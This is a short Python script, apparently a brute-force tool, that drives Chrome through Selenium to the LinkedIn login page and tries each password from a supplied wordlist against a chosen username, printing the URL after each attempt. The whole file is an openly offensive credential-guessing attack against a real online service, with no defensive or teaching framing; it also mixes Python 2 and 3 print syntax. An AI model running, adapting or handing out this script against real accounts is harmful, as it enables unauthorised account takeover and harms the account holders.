from selenium import webdriver 
from selenium.webdriver.chrome.options import Options
from optparse import OptionParser
import sys

parser = OptionParser()
parser.add_option("-t",dest="target", 
                  help="target's url: https://www.linkedin.com/uas/login", default="https://www.linkedin.com/uas/login")
parser.add_option("-u",dest="user", 
                  help="username", default="test")
parser.add_option("-p",
                  dest="pas",
                  help="wordlist: for example password.txt")
(options, args) = parser.parse_args(sys.argv)

url = options.target					
curuser=options.user
file= options.pas

passwords=[]
with open(file, "r") as s:
	for i in s:
		passwords.append(i)
		
#test
def	loginuserpass(passw):
	m=driver.current_url	
	username = driver.find_element_by_id("username")		
	username.clear()
	print("username: "+curuser)
	username.send_keys(curuser)		
	password = driver.find_element_by_id("password")
	password.clear()
	print("password: "+passw+"\n")
	password.send_keys(passw)			
	driver.find_element_by_class_name('login__form_action_container').click()
	n=driver.current_url
	print n
    
driver = webdriver.Chrome(executable_path=r'chromedriver.exe')
chrome_options = Options()
driver.get(url)


for i in range(len(passwords)):
	loginuserpass(passwords[i])
	i+=1


